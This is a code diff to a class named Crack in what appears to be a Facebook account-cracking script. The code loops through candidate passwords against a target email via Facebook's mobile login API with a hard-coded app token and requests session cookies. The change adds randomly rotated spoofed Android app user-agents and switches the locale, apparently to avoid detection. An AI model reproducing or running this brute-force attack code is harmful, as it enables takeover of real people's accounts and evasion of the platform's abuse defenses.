@@ -411,11 +411,12 @@ class Crack:
 		try:
 			for pw in pwx:
 				pw = pw.lower()
+				ua = random.choice(["Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]","Dalvik/2.1.0 (Linux; U; Android 5.1.1; F1 Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/Oppo;FBBD/Oppo;FBDV/F1;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1280};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; INE-LX1r Build/HUAWEIINE-LX1r) [FBAN/Orca-Android;FBAV/212.1.0.13.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/151534286;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/INE-LX1r;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2128};FB_FW/1;]"])
 				params = {
 					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
 					"sdk_version": {random.randint(1,26)}, 
 					"email": user,
-					"locale": "ja_JP",
+					"locale": "th_TH",
 					"password": pw,
 					"sdk": "android",
 					"generate_session_cookies": "1",
@@ -427,7 +428,7 @@ class Crack:
 					"x-fb-sim-hni": str(random.randint(20000, 40000)),
 					"x-fb-net-hni": str(random.randint(20000, 40000)),
 					"x-fb-connection-quality": "EXCELLENT",
-					"user-agent": Session().generate_ugent(),
+					"user-agent": ua,
 					"content-type": "application/x-www-form-urlencoded",
 					"x-fb-http-engine": "Liger"
 				}
